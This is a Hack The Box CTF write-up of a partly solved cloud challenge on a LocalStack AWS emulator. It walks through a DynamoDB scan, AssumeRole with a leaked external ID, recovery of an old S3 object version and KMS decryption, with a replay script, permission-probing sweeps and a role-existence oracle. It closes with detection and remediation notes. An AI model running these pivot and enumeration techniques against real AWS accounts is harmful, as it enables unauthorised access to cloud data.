---
title: "HTB CA2026 — Bought Riot: AssumeRole/ExternalId Chain and a Second Role That Won't Open (Partial)"
platform: Hack The Box
event: "Cyber Apocalypse CTF 2026: The Salt Crown"
challenge: Bought Riot
app: LocalStack AWS emulation (DynamoDB, STS, S3, KMS, Secrets Manager)
category: cloud
difficulty: medium
points: 975
type: writeup
status: closed
mitre:
  - T1078.004
  - T1580
  - T1619
  - T1552.007
  - T1550.001
tags:
  - writeup
  - HTB
  - Cloud
  - Security
  - aws
  - dynamodb
  - privilege-escalation
  - confused-deputy
related:
  - "[[HTB-CA2026-Wrong-Stamp-CloudTrail-Credential-Reuse-Log-Disablement]]"
aliases:
  - Bought Riot
  - CA2026 Bought Riot
created: 2026-07-26T16:05:50.231Z
updated: 2026-07-30T03:03:07.309Z
---

# Bought Riot — AssumeRole/ExternalId Chain and a Second Role That Won't Open (Partial)

> [!warning] Unsolved — flag not obtained
> The first pivot chain is fully solved and reproducible (§1–§4). The second hop, `supply-road-runner`, is unreachable from either principal we can hold. §6 is the eliminated set — roughly 55 IAM actions, five STS variants, and four exhaustive sweeps with retained artifacts. §8 is the single resume step.
> Two containers burned: `154.57.164.77` (25 Jul), `154.57.164.66` (26 Jul). **The scenario is deterministic** — same account `593847102664`, same `ROAD-3D9C`, same role names, same external IDs, same secret name across spawns. Only access keys, KMS key IDs, and S3 version IDs rotate.

## 1. Shape of the challenge

Two unlabelled ports. Fingerprint them: a bare `GET` returns `{"__type":"AccessDeniedException"…}` on the AWS API port and `<!DOCTYPE html>` on the briefing port. Credentials come from `/player-creds.json` on the briefing port; ignore its advertised `endpoint` of `http://127.0.0.1:4566`, which is the container's internal view.

The briefing's access paragraph gives exactly one instruction:

> *"Scan the table and isolate the LIVE row connected to the current accusation."*

> [!note] "connected to the current accusation" is descriptive, not a filter
> There is exactly **one** `LIVE` row in 224. The phrase is narrative glue explaining why that row matters, not a second criterion to apply. Contrast [[HTB-CA2026-Wrong-Stamp-CloudTrail-Credential-Reuse-Log-Disablement]], whose access paragraph described the *whole* task ("reconstruct the final recorded actions and determine which identity stopped the trail"). This room names only the entry point — which is itself the signal that it intends undirected multi-hop discovery from there.

The win condition is the narrative's two questions plus an `HTB{...}` string: **who started the rumor** (answered, §3) and **who paid to spread it** (blocked, §5).

## 2. The LIVE row — one signal row in 224

`dynamodb:Scan` is granted to the starting user. 224 rows, of which **223 are decoys**: each carries a `runner_external_id`, a `broker_code` from a rotating set (`ORION-BACKUP` 58, `AURORA-RELAY` 57, `ORION-STALE` 55, `VEGA-PROXY` 53), and a boilerplate `notes` value. Exactly one row differs:

```json
{
  "settlement_id":       "ROAD-3D9C",
  "status":              "LIVE",
  "runner_external_id":  "eastreach-supply-road-runner-3d9c",
  "broker_code":         "EASTREACH-RELAY",
  "scanner_role_arn":    "arn:aws:iam::593847102664:role/supply-road-scanner",
  "scanner_external_id": "eastreach-road-scanner-3d9c",
  "vendor_ref":          "eastreach-continuity",
  "manifest_bucket":     "supply-road-manifests"
}
```

Status distribution: `DRAFT` 69, `PENDING_AUDIT` 59, `VOID` 55, `CLOSED` 40, **`LIVE` 1**. Only the LIVE row carries `scanner_role_arn`, `scanner_external_id`, and `manifest_bucket`; the 223 decoys carry `notes: "Not routable for the live supply road."`

> [!important] The row holds **two** external IDs
> `runner_external_id` matches the naming shape of all 223 decoys. `scanner_external_id` is the one paired with `scanner_role_arn`. Using the runner value against the scanner role returns `AccessDenied` and reads exactly like a wrong overall approach. Pair each external ID with its own role.

## 3. The chain that works

```bash
# a. assume the scanner role with ITS external id
aws sts assume-role \
  --role-arn arn:aws:iam::593847102664:role/supply-road-scanner \
  --external-id eastreach-road-scanner-3d9c \
  --role-session-name miren-vale > assumed.json

# b. as the scanner: the manifest is redacted in its CURRENT version
aws s3api get-object --bucket supply-road-manifests \
  --key manifests/ROAD-3D9C.json /dev/stdout
# -> broker_user / runner_role_arn / payout_secret_name all "REDACTED"

# c. versioning is on, and the PRIOR version was never scrubbed
aws s3api list-object-versions --bucket supply-road-manifests \
  --query 'Versions[?IsLatest==`false`].[Key,Size,VersionId]' --output text
# -> manifests/ROAD-3D9C.json  491  <version-id>     (current is 382 bytes)

aws s3api get-object --bucket supply-road-manifests \
  --key manifests/ROAD-3D9C.json --version-id <version-id> blob.bin
```

**The old version is not JSON.** It is LocalStack's KMS envelope:

```
kms:v3:<key-uuid>:<nonce>:<base64-ciphertext>
```

`jq` fails with `parse error: Invalid numeric literal at line 1, column 4`, which reads like a corrupt download. It is ciphertext, and the key ID is in plaintext in the blob. The scanner role holds `kms:Decrypt` — while `DescribeKey`, `ListKeys`, and `GetKeyPolicy` are all denied, a named-resource grant with no enumeration around it:

```bash
aws kms decrypt --ciphertext-blob fileb://blob.bin \
  --output text --query Plaintext | base64 -d | jq .
```

```json
{
  "settlement_table":     "supply-road-settlements",
  "broker_user":          "road-messenger",
  "runner_role_arn":      "arn:aws:iam::593847102664:role/supply-road-runner",
  "payout_secret_name":   "supply-road/payout/eastreach-relay-3d9c",
  "broker_code_template": "{broker_code}",
  "schema_version":       "2026-01",
  "owner":                "eastreach-logistics"
}
```

**`broker_user: road-messenger` answers "who started the rumor."**

## 4. The reproducible replay script

The instance times out; the chain is ~15 commands. This lands at the frontier in one paste — only the three values at the top change per spawn.

```bash
IP=<ip>; P1=<port1>; P2=<port2>
mkdir -p br2 && cd br2

BRIEF=""; APIP=""
for p in $P1 $P2; do
  if curl -s -m 5 "http://$IP:$p/" | head -c 40 | grep -q DOCTYPE; then BRIEF=$p; else APIP=$p; fi
done
curl -s "http://$IP:$BRIEF/player-creds.json" -o creds.json

restore_auditor () {
  unset AWS_SESSION_TOKEN
  export AWS_ENDPOINT_URL="http://$IP:$APIP"
  export AWS_DEFAULT_REGION=$(jq -r .region creds.json)
  export AWS_ACCESS_KEY_ID=$(jq -r .access_key_id creds.json)
  export AWS_SECRET_ACCESS_KEY=$(jq -r .secret_access_key creds.json)
}
use_role () {
  restore_auditor
  aws sts assume-role --role-arn "$1" --external-id "$2" --role-session-name miren-vale \
    > try.json 2>err.txt || { echo "DENY:"; head -1 err.txt; return 1; }
  export AWS_ACCESS_KEY_ID=$(jq -r .Credentials.AccessKeyId try.json)
  export AWS_SECRET_ACCESS_KEY=$(jq -r .Credentials.SecretAccessKey try.json)
  export AWS_SESSION_TOKEN=$(jq -r .Credentials.SessionToken try.json)
  aws sts get-caller-identity --query Arn --output text
}

restore_auditor
: > pages.json; START=""
for i in $(seq 1 50); do
  if [ -z "$START" ]; then
    aws dynamodb scan --table-name supply-road-settlements > p.json || break
  else
    aws dynamodb scan --table-name supply-road-settlements --exclusive-start-key "$START" > p.json || break
  fi
  cat p.json >> pages.json
  START=$(jq -c '.LastEvaluatedKey // empty' p.json); [ -z "$START" ] && break
done
jq -s '[.[].Items[]]' pages.json > items.json
jq '[.[] | select(.status.S=="LIVE")]' items.json > live.json

SID=$(jq -r '.[0].settlement_id.S' live.json)
SROLE=$(jq -r '.[0].scanner_role_arn.S' live.json)
SEXT=$(jq -r '.[0].scanner_external_id.S' live.json)
BUCKET=$(jq -r '.[0].manifest_bucket.S' live.json)

use_role "$SROLE" "$SEXT"
VID=$(aws s3api list-object-versions --bucket "$BUCKET" \
  --query "Versions[?Key=='manifests/$SID.json' && IsLatest==\`false\`].VersionId" --output text | head -1)
aws s3api get-object --bucket "$BUCKET" --key "manifests/$SID.json" --version-id "$VID" blob.bin >/dev/null
aws kms decrypt --ciphertext-blob fileb://blob.bin --output text --query Plaintext | base64 -d > plain.json
jq . plain.json
```

> [!warning] Shell-hygiene traps that cost real time here
> - A failed `use_role` that does not `restore_auditor` first leaves you silently in the *previous* role. Several "results" in this session were void because the shell was in an unexpected identity. Always print and read `sts get-caller-identity` after switching.
> - Sourcing a stale `replay.sh` in a second tab repoints `AWS_ENDPOINT_URL` at a dead container. `Could not connect to the endpoint URL` in the middle of a sweep means the whole sweep is void.
> - Probe scripts must **whitelist success**, never blacklist known failures. A `case` matching on `AccessDenied|ResourceNotFound` and treating everything else as a hit reports connection errors as hits.
> - `--role-session-name` must be 2–64 chars; a 1-char name fails validation and prints nothing, which looks identical to a silent negative.

## 5. Win condition — and the wall

Two targets, both requiring `supply-road-runner`:

| Target | Why it matters | State |
|---|---|---|
| `supply-road/payout/eastreach-relay-3d9c` | "who paid to spread it" | `secretsmanager:GetSecretValue` denied to both principals |
| 24 `.txt` under `compliance/`, `archives/`, `routing-notes/` | only content in the environment confirmed to exist and never read | `s3:GetObject` and `s3:GetObjectVersion` denied to both |

**The wall, exactly:**

```
aws sts assume-role --role-arn arn:aws:iam::593847102664:role/supply-road-runner ...
-> AccessDenied: User: arn:aws:iam::593847102664:user/eastreach-supply-auditor
   is not authorized to perform: sts:AssumeRole on resource:
   arn:aws:iam::593847102664:role/supply-road-runner
```

Identical from the scanner role.

> [!important] That message does not mean what it appears to
> The **same** text appears when the external ID is wrong on a role you legitimately *can* assume — verified by feeding `supply-road-scanner` a deliberately wrong external ID. So it does not distinguish "your identity policy lacks the action" from "your external ID is wrong." Concluding the former (as this session initially did) closes off a whole line of attack prematurely.

### Verified principal inventory

Existence established by the STS oracle in §6, with a control.

| Principal | Type | Exists | Reachable | Grants |
|---|---|---|---|---|
| `user/eastreach-supply-auditor` | IAM user | ✅ (ours) | ✅ | `sts:GetCallerIdentity`, `sts:GetSessionToken`, `sts:AssumeRole` (scanner only), `dynamodb:Scan`, `dynamodb:GetItem` |
| `role/supply-road-scanner` | IAM role | ✅ oracle | ✅ ext-id `eastreach-road-scanner-3d9c` | `s3:GetObject` (`manifests/*` only), `s3:ListBucket`, `s3:ListBucketVersions`, `s3:GetBucketAcl/Encryption/Tagging`, `kms:Decrypt`, `dynamodb:Scan`, `dynamodb:GetItem` |
| `role/supply-road-runner` | IAM role | ✅ oracle | ❌ | unknown — the wall |
| `federated-user/floci-session` | STS federated | ✅ minted | ✅ via `GetSessionToken` | none; denies everything |
| `road-messenger` | user (claimed) | ❌ not a role | — | named as `broker_user`; user-existence untestable with our grants |

**The IAM surface is exactly two roles.** Not "we found two" — enumerated with a control and closed.

## 6. Eliminated — do not re-walk

Each ran to completion against a live container. Artifacts retained: `roles-verified.txt`, `getitem-scanner.txt`, `secrets.txt`, `cand.txt`.

### The STS role-existence oracle (works, and reads backwards)

A well-formed ARN naming a **nonexistent** role mints credentials; a **real** role returns `AccessDenied`. **Denial proves existence.** Control `zzz-control-does-not-exist-9999` correctly absent from the results, so the negatives are real.

`roles-verified.txt` — 30 candidates probed, 2 hits:

```
EXISTS  supply-road-runner
EXISTS  supply-road-scanner
```

Confirmed **non-existent** as roles: every narrative name (`seralyne`, `lady-seralyne`, `suncourt`, `suncourt-clerk/relay/registrar/scribe`, `vaultrune`, `stormbound`, `eastreach`, `miren-vale`), every `broker_user` value from the manifests (`road-messenger`, `road-archive`, `eastreach-settlement-bot`, `eastreach-logistics`), `eastreach-continuity`, `eastreach-archive`, `eastreach-relay`, `eastreach-supply-auditor`, `road-compliance`, and every `supply-road-*` guess (`compliance`, `broker`, `messenger`, `payout`, `auditor`, `admin`, `manifest-writer`).

> [!caution] The equivalent oracles for DynamoDB and S3 do **not** work
> Invented table and bucket names deny identically to plausible ones, because those denials are action-level rather than resource-level. Control `zzz-control-9999` returned `AccessDenied` for both. Any conclusion drawn from table/bucket name probing in this environment is worthless.

### STS surface

- `AssumeRole` on the runner with **all 457** identifiers from the table (every `runner_external_id`, `scanner_external_id`, `broker_code`, `settlement_id`), from **both** principals — 914 calls, zero hits.
- Narrative-derived external IDs (`seralyne`, `lady-seralyne`, `suncourt`, `suncourt-relay`, `vaultrune`, `stormbound`, `road-messenger`, `eastreach-continuity`, `-3d9c` variants) — all denied.
- `--role-session-name` variants and `--tags` session tags (`broker_code`, `broker_user`, `settlement_id`, `owner`) — all denied.
- `AssumeRoleWithWebIdentity` — `InvalidIdentityToken` for both a bare string and a well-formed unsigned JWT.
- `AssumeRoleWithSAML` — denied, but the error names **the principal we supplied** (`saml-provider/dummy`), showing trust evaluation keys on the submitted principal string.
- `GetSessionToken` — **succeeds**, returning a *different* principal: `arn:aws:sts::593847102664:federated-user/floci-session`. Those credentials deny everything. (`floci` also appears as the bucket-owner DisplayName, so the name is config-derived.)
- `GetFederationToken` — `sts:GetFederationToken` denied.

### Secrets / parameters

`broker_code_template: "{broker_code}"` documents the secret name as generated: `supply-road/payout/{broker_code|lower}-{settlement_id_suffix|lower}`. All **224** derivable names (`secrets.txt`) swept from both principals — zero readable.

- `BatchGetSecretValue`, `DescribeSecret`, `ListSecretVersionIds`, `GetResourcePolicy` — denied.
- SSM `GetParameter` / `GetParametersByPath` on every plausible path, both principals — denied.
- Cross-region (`us-east-2`, `us-west-1/2`, `eu-west-1`, `eu-central-1`, `ap-southeast-1`) — denied everywhere.

### S3

- Anonymous/unsigned (`--no-sign-request`) and raw `curl` — `403` / `MissingAuthentication`. Bucket policy: `NoSuchBucketPolicy`. ACL: owner `FULL_CONTROL` only. SSE: `AES256`, so no second KMS key.
- `GetObjectVersion` on the locked prefixes — denied. (A *distinct* action from `GetObject` and always worth testing; closed here.)
- `GetObjectTagging`, `HeadObject`, `GetObjectAttributes`, `GetObjectAcl`, `SelectObjectContent` on locked prefixes — denied.
- Object tags on readable objects — empty. Delete markers — **zero**. Non-current versions bucket-wide — exactly **one**, the KMS blob in §3.
- 164 manifests pulled; only `ROAD-3D9C.json` contains ciphertext. No other file holds `kms:v`.
- Manifest `broker_user` distribution: `eastreach-logistics` 44, `road-archive` 42, `REDACTED` 40, `eastreach-settlement-bot` 37. All four tested as roles — none exist.

### DynamoDB

- Writes: `PutItem`, `UpdateItem`, `DeleteItem`, `BatchWriteItem`, `TransactWriteItems`, PartiQL `INSERT`/`UPDATE` — all denied. **This is not a config-poisoning room.**
- `Query`, `PartiQLSelect`, `ListStreams`, `DescribeTable` — denied. GSI scans by guessed index name — action-level denial, uninformative.
- **`GetItem` swept across all 385 known IDs as the scanner (`getitem-scanner.txt`): exactly 224 `ALLOW`**, matching the Scan's result set precisely. The 161 IDs that exist only as manifest objects return empty — no such item.
  **Conclusion: no hidden row population; the Scan is not filtered.** `GetItem` is principal-scoped (auditor 0/385, scanner 224/385), *not* key-scoped — an earlier `LeadingKeys` reading was an artifact of comparing two different principals.
- Table/bucket intersection: 224 table rows vs 164 manifest objects share only **3** IDs — `ROAD-3D9C` (LIVE), `ROAD-3C21` (DRAFT decoy), `ROAD-9B11` (VOID decoy). The latter two carry nothing usable.

### Compute / other

- `lambda:CreateFunction` (the `iam:PassRole` privesc primitive) and `lambda:InvokeFunction` — denied.
- `ec2:DescribeInstances`, `ecs:ListClusters`, `sqs`, `sns`, `states`, `iam:*` (including `SimulatePrincipalPolicy`) — denied. **No IMDS surface: no compute we can reach, no SSRF sink, so `169.254.169.254` is not in play.**
- LocalStack default/unknown credentials (`test`/`test`, `000000000000`, `foo`, an `LSIA…` key) — `InvalidClientTokenId`. IAM enforcement is genuinely on; no default-root backdoor.
- `_localstack/health`, `_localstack/init`, `_localstack/diagnose` — 404, routed to S3. Internal endpoints blocked.
- Web surface: briefing port serves exactly `/`, `/player-creds.json`, `/health`. Directory brute force found nothing else. No flag string anywhere on disk.
- **Pacu** `iam__bruteforce_permissions` — found only `sts:GetCallerIdentity` and `sts:GetSessionToken` (its "8 permissions" = 2 × 4 regions). It **missed** four grants confirmed by hand, so its silence is not evidence of absence. `secrets__enum` and `dynamodb__enum` both fail at their `List*` prerequisite, which this environment denies by design.

## 7. Leading open candidates

`[Speculation]` — none of these has positive evidence; they are the untested remainder.

1. **The runner's trust policy names a service principal**, not an IAM principal — e.g. `lambda.amazonaws.com`. That would make this a genuine confused deputy: something inside the environment assumes the role on a trigger, and the intended play is to *cause* the trigger rather than assume the role directly. Every trigger surface we could test (Lambda create/invoke, S3 notifications, DynamoDB Streams, SQS/SNS) is denied, so the trigger — if it exists — is not one we found. **This is the candidate I would rank first.**
2. **A third principal exists that is not a role.** `broker_user: road-messenger` is named as a *user*; the oracle proves no such role. If credentials for it exist, they are plausibly in the 24 unreadable `.txt` files — circular from here.
3. **`vendor_ref: eastreach-continuity`** is the only LIVE-row field never used for anything. Not a role, not a readable secret, not a bucket.
4. **`broker_code_template` may substitute somewhere other than the secret name.** We assumed Secrets Manager; the template could key a different resource entirely.

## 8. THE single resume step

Get the runner role's **trust policy**. Everything in §7 collapses to one question — *which principal is permitted to assume it* — and no probe we hold answers it indirectly.

```bash
# All denied from both principals; re-verify per spawn in case policy shape varies:
aws iam get-role --role-name supply-road-runner
aws iam list-role-policies --role-name supply-road-runner
aws iam get-account-authorization-details
```

If IAM reads stay denied, resume options in order of expected value:

1. **Spend the challenge's hint.** 975 points at *medium* with public solves means the intended path is structurally simpler than anything in §6. The size of the eliminated set is itself evidence we are attacking the wrong layer.
2. **Have someone read the LIVE row cold**, without this note's framing. Every hypothesis in §6 was generated from the assumption that the runner must be assumed *directly*. If that assumption is wrong, §6 is exhaustive against the wrong question.
3. **Recover the LocalStack init/seed data.** The scenario is deterministic across containers; if the init script is exposed anywhere on the wire it names the trust relationship outright.

## Tools & techniques
AWS CLI v2 against a LocalStack endpoint · `aws sts assume-role` with `--external-id` · `aws s3api list-object-versions` / `get-object --version-id` · `aws kms decrypt` on a `kms:v3:` envelope · `jq` (`fromjson`, `@tsv`, set arithmetic via `comm`) · `xargs -P` for parallel permission sweeps · Pacu (`iam__bruteforce_permissions`, `secrets__enum`, `dynamodb__enum`)
Concepts: config-store-driven role pivots · external-ID confused-deputy design · S3 object versioning defeating field-level redaction · envelope encryption at rest in an emulator · IAM action-boundary probing (`GetObject` vs `GetObjectVersion`; `Scan` vs `GetItem` vs `Query` vs `PartiQLSelect`) · error-message oracles and their failure modes

## MITRE ATT&CK
- **T1078.004** Valid Accounts: Cloud Accounts — issued auditor credentials as the entry principal
- **T1580** Cloud Infrastructure Discovery — DynamoDB registry scan revealing role/bucket topology
- **T1619** Cloud Storage Object Discovery — manifest bucket and version enumeration
- **T1552.007** Unsecured Credentials: Container API — role ARN and external ID stored as plaintext config in a data store
- **T1550.001** Use Alternate Authentication Material: Application Access Token — STS session credentials from `AssumeRole`

> [!note] Honest scope of this mapping
> T-codes are inferred from observed API calls and were not re-verified against the live ATT&CK matrix. `T1552.007` is the weakest fit — it is scoped to container APIs, and "role-pivot data in a config store" has no exact technique. `T1580` may be better expressed as `T1526` Cloud Service Discovery.

## Detection / blue-team & fix notes
- **The design defect is that a data-plane row drives a control-plane decision.** `scanner_role_arn` + `scanner_external_id` in a DynamoDB row means anyone with `dynamodb:Scan` obtains a role-assumption recipe. Read-only registry access becomes a credential-discovery primitive. Store role bindings in IAM, not in application data.
- **Redaction-by-overwrite is not redaction when versioning is on.** The current object was scrubbed to `REDACTED`; the prior version retained everything. Real remediation is a lifecycle rule expiring non-current versions, plus rotation of everything the old version exposed. **This is the single most transferable finding here.**
- **`kms:Decrypt` granted without `DescribeKey`** looks like least privilege and is not — decrypt is the sensitive verb; enumeration is cosmetic. Scope `kms:Decrypt` by `kms:EncryptionContext` and grant it only to the principal that must read that specific ciphertext.
- **Detection:** `s3:GetObject` carrying a `versionId` for a **non-current** version is rare in normal application traffic and is a strong signal of exactly this attack — especially when the same principal read the current version of the same key moments earlier.
- **Detection:** `kms:Decrypt` from a principal whose only other activity is S3 reads, with no matching `Encrypt`, is worth surfacing.
- **External IDs are not secrets**, and this room shows why treating them as one fails: they sat in a scannable table. They exist to stop a *third party* who knows only the role ARN from being a confused deputy — they are not an authorization control on their own.

## Open items / resume checklist

- [ ] Recover the runner role's trust policy (§8) — the one fact that unblocks everything
- [ ] Determine whether `supply-road-runner` is assumable by an IAM principal at all, or only by a service principal
- [ ] Resolve `vendor_ref: eastreach-continuity` — unused in every path tested
- [ ] Read the 24 `.txt` files under `compliance/`, `archives/`, `routing-notes/`
- [ ] Read `supply-road/payout/eastreach-relay-3d9c` — the "who paid" answer
- [ ] Confirm whether `broker_code_template` substitutes into something other than the secret name
- [ ] Flip `status` to `complete` and record the flag once solved

## Cross-references
- [[HTB-CA2026-Wrong-Stamp-CloudTrail-Credential-Reuse-Log-Disablement]] — the other CA2026 cloud room; same LocalStack harness, same two-port fingerprinting, same "one signal row among hundreds of decoys" construction, and the same trap of a decoy that is chronologically or structurally first. Worth reading together for the harness conventions.

## Correction — probe-harness bug found post-publication (2026-07-26)

> [!danger] A number of the denials recorded in §6 were never actually tested
> The service-level envelope probes in this room used the pattern:
>
> ```bash
> for c in "dynamodb list-tables" "s3api list-buckets"; do
>   aws $c >/dev/null 2>&1 && echo OK || echo DENIED
> done
> ```
>
> **In zsh, `$c` does not word-split** (it does in bash). Every command ran as `aws "dynamodb list-tables"` — a single invalid argument — exited non-zero, and printed `DENIED`. Discovered while working the CA2026 *Closed Gate* room, where the identical harness reported seven false denials and the very next command succeeded against a service it had just declared closed.
>
> **Second, related bug:** `"arn:aws:iam::$A:role/$1"` — zsh reads `$A:r` as the `:r` history modifier (strip extension), yielding `arn:aws:iam::593847102664ole/...`. Any role sweep built that way tested nothing and returns `InternalFailure: Invalid ARN`, which is easy to misread as a service fault.

### What is now suspect vs. still valid

| Result set | Status |
|---|---|
| Initial service-level envelope probes (`dynamodb list-tables`, `s3api list-buckets`, `iam list-users`, `lambda list-functions`, `secretsmanager list-secrets`, `ssm describe-parameters`, `sqs list-queues`, `kms list-keys`, EC2 / ECS / SNS / StepFunctions) | ⚠️ **Re-test required** — ran through the broken `for c in` loop |
| `chk_role` narrative-name sweep (`seralyne`, `suncourt`, `vaultrune`, …) | ⚠️ **Void** — malformed ARN *and* pointed at a dead container |
| `rprobe.sh` role sweep → `roles-verified.txt` | ✅ Valid — hardcoded account number, `xargs` single-argument form, control line present |
| 457-identifier external-ID sweeps (both principals) | ✅ Valid — `xargs -I{}`, no word-splitting |
| 224 derived secret-name sweep | ✅ Valid — same form |
| Everything run as a direct single command (the working scanner chain, KMS decrypt, S3 version reads, DynamoDB `GetItem`/`Scan`) | ✅ Valid |

### Corrected probe form

```bash
while IFS= read -r c; do
  printf '%-60s ' "$c"; eval "aws $c" >/dev/null 2>&1 && echo OK || echo DENIED
done <<'EOF'
sts get-caller-identity
dynamodb list-tables
EOF
```

**The first line must be a call known to succeed.** If the control reads `DENIED`, the harness is broken and every result beneath it is noise rather than evidence.

### Resume implication

§8 names the runner role's trust policy as the single unblocker, and that still holds. But **re-run the service envelope with the corrected harness before spending further effort there** — a grant that was reported denied and never actually exercised is the cheapest remaining place to find the missing hop. Closed Gate turned on exactly this: `sqs:ReceiveMessage` was granted the whole time while `GetQueueUrl` and `GetQueueAttributes` denied, and a broken probe had reported the entire service closed.

---

## Change Log
- 2026-07-30 — `status` moved `complete` → `closed`, superseding the change made earlier today.
- 2026-07-30 — `status` moved `draft` → `complete`. The event is closed and this room is permanently unsolved, so `draft` — which implies work in progress — was the wrong signal. `status` now tracks whether the **note** is finished, not whether the room was solved; the `-PARTIAL` filename suffix and the Open items section carry the unsolved state.
- 2026-07-26 — Note created after two container sessions. Documents the solved scanner chain (LIVE row → AssumeRole+ExternalId → S3 non-current version → KMS decrypt), the reproducible replay script and its shell-hygiene traps, the verified principal inventory (2 roles, oracle-confirmed with a control), the full eliminated set (~55 IAM actions, five STS variants, four sweeps with retained artifacts), the working role-existence oracle plus the two lookalike oracles that do **not** work, and the single resume step. Flag not obtained; `status: draft`.
